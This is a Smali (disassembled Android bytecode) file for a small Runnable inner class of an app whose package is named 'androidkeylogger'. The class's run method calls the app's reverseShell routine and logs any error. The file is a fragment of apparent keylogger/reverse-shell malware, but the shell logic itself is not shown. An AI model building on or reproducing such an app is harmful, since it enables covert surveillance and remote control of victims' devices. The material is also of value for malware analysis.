.class Lcom/bshu2/androidkeylogger/MainActivity$100000000;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/bshu2/androidkeylogger/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/bshu2/androidkeylogger/MainActivity;


# direct methods
.method constructor <init>(Lcom/bshu2/androidkeylogger/MainActivity;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/lang/Object;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/bshu2/androidkeylogger/MainActivity$100000000;->this$0:Lcom/bshu2/androidkeylogger/MainActivity;

    return-void
.end method

.method static access$0(Lcom/bshu2/androidkeylogger/MainActivity$100000000;)Lcom/bshu2/androidkeylogger/MainActivity;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/bshu2/androidkeylogger/MainActivity$100000000;->this$0:Lcom/bshu2/androidkeylogger/MainActivity;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 6
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 46
    move-object v0, p0

    move-object v4, v0

    :try_start_0
    iget-object v4, v4, Lcom/bshu2/androidkeylogger/MainActivity$100000000;->this$0:Lcom/bshu2/androidkeylogger/MainActivity;

    invoke-virtual {v4}, Lcom/bshu2/androidkeylogger/MainActivity;->reverseShell()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 48
    :goto_0
    return-void

    .line 46
    :catch_0
    move-exception v4

    move-object v2, v4

    .line 48
    const-string v4, "Reverse Shell Error"

    move-object v5, v2

    invoke-virtual {v5}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-static {v4, v5}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v4

    goto :goto_0
.end method
